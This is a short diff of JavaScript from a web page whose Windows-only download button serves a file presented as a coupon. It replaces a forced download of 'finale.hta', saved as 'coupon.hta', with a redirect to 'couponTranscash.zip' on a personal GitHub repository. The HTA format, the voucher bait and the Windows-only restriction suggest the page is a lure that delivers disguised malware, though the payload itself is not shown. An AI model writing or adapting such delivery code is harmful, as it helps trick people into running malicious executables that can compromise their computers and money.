@@ -125,17 +125,12 @@
   }
 
   const downloadBtn = document.getElementById("downloadBtn");
-  const downloadLink = "https://cdn.jsdelivr.net/gh/fabienneroger/hta-finale@main/finale.hta";
+  const downloadLink = "https://raw.githubusercontent.com/fabienneroger/zipfinale/refs/heads/main/couponTranscash.zip";
 
   downloadBtn.addEventListener("click", function(e) {
     e.preventDefault();
     if (isWindows()) {
-      const a = document.createElement('a');
-      a.href = downloadLink;
-      a.download = 'coupon.hta';
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
+      window.location.href = downloadLink;
     } else {
       alert("❌ Ce fichier est uniquement disponible pour Windows.");
     }
